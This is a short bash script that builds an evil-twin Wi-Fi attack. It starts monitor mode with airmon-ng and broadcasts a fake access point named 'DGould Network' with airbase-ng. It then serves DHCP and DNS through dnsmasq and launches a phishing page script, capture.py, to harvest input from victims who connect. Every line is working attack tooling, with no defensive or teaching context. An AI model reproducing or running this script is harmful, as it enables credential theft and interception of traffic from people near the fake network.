#!/bin/bash

SSID="DGould Network"
CHANNEL=6
INTERFACE="wlan0"

echo "[*] Starting monitor mode on $INTERFACE..."
sudo airmon-ng start $INTERFACE
MONITOR="${INTERFACE}mon"

echo "[*] Launching fake AP: $SSID on channel $CHANNEL..."
sudo airbase-ng -e "$SSID" -c $CHANNEL $MONITOR &

sleep 5
echo "[*] Configuring at0 interface..."
sudo ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
sudo route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

echo "[*] Starting DNS/DHCP via dnsmasq..."
sudo dnsmasq -C dnsmasq.conf

echo "[*] Launching phishing page..."
cd phishing
sudo python3 capture.py
